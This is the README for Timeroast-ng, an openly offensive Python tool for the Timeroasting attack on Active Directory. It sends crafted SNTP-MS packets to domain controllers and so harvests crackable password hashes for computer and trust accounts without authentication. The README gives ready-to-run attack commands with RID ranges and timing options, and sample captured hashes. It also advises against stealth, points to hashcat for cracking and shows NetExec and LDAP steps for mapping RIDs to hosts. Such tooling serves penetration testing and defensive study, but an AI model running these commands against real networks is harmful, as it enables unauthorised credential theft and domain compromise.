# Timeroast-ng

Timeroasting ([Paper - Timeroasting, Trustroasting and Computer Spraying](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf) by SecuraBV;
their [Repo - Timeroasting](https://github.com/SecuraBV/Timeroast)) is a simple attack
technnique that leverages the design concept of Microsoft's authentication extension
for the Simple Network Time Protocol ([SNTP-MS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sntp/)).

![example-output](/assets/example.png)

This technique involves sending specially crafted NTP packets to the domain controller
of an Active Directory in order to retrieve a checksum that was calculated using the
password of the targeted **computer** account. Since a server will only reply to requests
made from computer accounts, it is possible to retrieve password hashes for all computer
accounts in a domain. The resulting list of hashes can be cracked with hashcat using mode
`31300`.

## Installation

The main tool works out of the box with no dependencies. You can simply clone the repository -
optional dependencies are [impacket](https://github.com/fortra/impacket) (for `resolveRID.py`)
and [rich](https://github.com/Textualize/rich) to add colored output support.

Manual setup
```bash
git clone https://github.com/MatrixEditor/timeroast-ng
cd timeroast-ng
python3 timeroast-ng.py -r1000-2000 -T5 <dc_ip>
```

Installation via `pip`:
```bash
pip install git+https://github.com/MatrixEditor/timeroast-ng
```

## Background

What the hell is [SNTP-MS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sntp/)?
First of all, the Network Time Protocol (NTP) allows to place an optional authenticator payload,
storing a key identifier and an arbitrary digest value. The basic message flow can
be broken down to the following:

```
+------------+      NTP Packet (UDP, 123)
| Client NTP +------------------------------+
|  Request   | (1)                          |
+------------+                     +--------v---------+
                                   | Server processes |
                                   |  Client request  |
                                   +--------+---------+
                                            |
                                            |
                                   RID linked to Computer: Yes
                                            | (2)
                                   +--------v----------+
+-----------------+                | Server calculates |
| Client verifies | (3)            |  checksum using   |
|  NTP-Response   <----------------+ computer password |
+-----------------+    NTP-Reply   +-------------------+
```

1. The client prepares an NTP packet with the custom _Authenticator_ extension that stores
   the relative identifier (RID) of the requestor (computer account).
2. Server receives the request: packets of length `68` (_Authenticator_) and `120`
   (_ExtendedAuthenticator_) will be processed. Only if the given RID in the request packet
   is linked to a computer account, the server will generate a response. The reply will
   contain a checksum that was generated using the password of the target account. Algorithm:
   ```python
   MD5(MD4(password.encode("utf16-le") + response_message[:48]))
   ```
   All other NTP-related fields will be filled out normally as defined by NTP.
3. Normally, the client would verify the response by using its own password. Since we are only
   interested in capturing the hash (and salt), the flow ends here.

Q: **So, why is this useful?**

With this approach, any unauthenticated attacker could enumerate the RIDs of all computer accounts
within the domain and can try to crack their passwords. Moreover, since _Trust-Accounts_ are
computer accounts, they will be in the resulting list too.

Q: **There's an option to let the server calculate the checksum using the old password. Why can't we**
**leverage this behaviour to distinguish whether the password has changed recently on the target**
**computer account?**

Simply because we can't control the response message data. As the reply contains timestamps that we
can't predict, there is no gain in using this feature.

---

Generally speaking, _Timeroasting_ can be used to **anonymously** get the RIDs of all computer
accounts and trust accounts together with their password hashes. However, there is a huge downside:
we can't map the RID to a valid username. Currently, there is no option to anonymously map the
gathered identifiers with their correct username. Approaches could be

- Try to resolve the hostname of each Windows computer in the local network (e.g. using [NetExec](https://github.com/Pennyw0rth/NetExec))
    ```console
    $ nxc smb <cidr> --generate-hosts-file <outputfile>
    ```
- Generate a list of valid computer names and try password spraying (in case you cracked it).

Another way to resolve the computer name is by querying the domain controller using an authenticated
user. First of all, we need the domain's SID (e.g. with [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
by impacket) - which is everything that is needed. The final LDAP query we have to execute looks
like this:
```
(&(objectSid=<Domain-SID>-<RID>))
```

To automate these queries one can use [resolveRID](resolveRID.py) to resolve the RID to an existing
computer account.


## Usage

The main script _timeroast-ng.py_ is designed for two modes of operation, both times supporting only the basic _Authenticator_ extension.

```txt
usage: timeroast-ng.py [options] dc_ip

Implementation of the Timeroasting attack to grab hashes from computer accounts using SNTP-MS.

options:
  -h, --help           show this help message and exit
  -no-color            disables colorized output (enabled by default if rich is not installed)
  -l, --listener ADDR  Local address to listen on

Target Options:
  dc_ip                Target Domain Controller IP address or host.
  -rt RID_FILE         Path to a file containing relative identifiers (RIDs) to target (TargetedTimeroast).
                       Each line will be interpreted as a RID range.
  -r, -range RANGES    Set the RID brute force range(s). Format is [start][-][end][, ...], whereby one
                       element must be present. For instance, '1-10' would be valid and '-10' or '10-' too.
                       You can use '-' to try ALL available RIDs (0 to (1 << 31) - 1). If start is not
                       specified it will be set to zero and end will be UINT32_MAX - 1.

Collection Options:
  -use-oldkey          Queries for the old password upon receiving a valid responce from the target server.
  -only-oldkey         Only queries for the old password of the machine account
  -skip-duplicate      Collects only new hashes. (Only together with -append and -outfile) This will work
                       only if the RID has been written to the hashes file.

Timing options:
  -non-blocking        Executes in non-blocking mode
  -wait SECONDS        Waits X seconds (float) after sending all requests (non-blocking mode only). Default
                       delay is 0.5s.
  -T <0-5>             Set timing template (higher is faster). Default template is T3.
  -timeout TIMEOUT     Timeout for local socket (blocking-mode) / refesh interval (non-blocking mode) in
                       seconds (default=0.01)

Output Options:
  -outfile OUTFILE     Stores the captured hashes into the given file. (use -append to add data to an
                       existing file)
  -append              Does not overwrite existing captured hashes
  -no-userid           Remove RID from output hash (otherwise --username must be used with hashcat)
```

## Non-Blocking Mode

This mode is recommended for users who don't have time to waste and don't need to be stealthy. For instance:
```console
$ python3 timeroast-ng.py <dc_ip> -r1000-2000 -T5 -non-blocking
```
will start an attack in non-blocking mode (means _faster_) on RIDs starting from `1000` to `2000`
(exclusive). The result could be something like this:
```
$ timeroast-ng.py 192.168.56.11 -r1000-1200 -T5 -non-blocking
[*] User RID will be added to the output hash - make sure to use --username with hashcat to crack them!
[*] Starting Timeroasting attack against: 192.168.56.11
1001:$sntp-ms$b644b0e1f8723f518c7d131c238b2ab9$1c020ae900000074000a5450c0a8380aeb814a1f1e19b0ab0000000000000000eb814d8c4a21c39feb814d8c4a21f446
1105:$sntp-ms$09737ab1e7c86ceaa9f9042c84d45560$1c020ae900000074000a5450c0a8380aeb814a1f1f2c1be70000000000000000eb814d8c4b3444abeb814d8c4b3453c4
1104:$sntp-ms$3c3ac1f9eabf9bc6e83a1682cb54f8ba$1c020ae900000074000a5450c0a8380aeb814a1f1f2961f90000000000000000eb814d8c4b318259eb814d8c4b3199d5
1123:$sntp-ms$ec534d53bef0508ed3febc99bb66f94a$1c020ae900000074000a5450c0a8380aeb814a1f1f6feea50000000000000000eb814d8c4b781916eb814d8c4b782327
1122:$sntp-ms$93dec08a525fd1df36ef9e204c13e255$1c020ae900000074000a5450c0a8380aeb814a1f1f6c1fe30000000000000000eb814d8c4b744a54eb814d8c4b7457c0
```

Some notes on this mode of operation:
- Receiving messages is done in a separate thread, therefore sending all request may complete before
  the server has been able to respond to valid packets. If your output contains less responces than
  expected, try to increase the `-wait` value.
- Since this mode will utilize the whole bandwith of the network, the server may not be able to respond
  directly to the first message received. Therefore, the waiting time at the end should be increased the
  lower the specified range is.
- **this mode is fast**
- **It is recommended to always use `-T5` with this mode as it will give the best results**

## Blocking-IO Mode

This is the default implementation using plain Pyton sockets (yes, a very primitive approach)
that will block until a timeout occurs or a packet was received.
```console
$ python3 timeroast-ng.py <dc_ip> -r1000-1200 -T5
```

## Range Specification

Timeroast-ng supports multiple range definitions thaz follow a broader pattern: `[start][-][end][, ...]`.
The following list contains valid examples:
```bash
-r-                         # MIN to MAX (exclusive)
-r-100                      # MIN to 100 (exclusive)
-r100-                      # 100 to MAX (exclusive)
-r 1001                     # only 1001
-r 1000-2000                # 1000 to 2000 (exclusive)
-range 10,20,100-200        # 10, 20 and from 100 to 200 (exclusive)
```

You can also write a file that contains range specifications in each line (use `-rt <file>`).

## License

Distributed under the MIT License. See LICENSE for more information.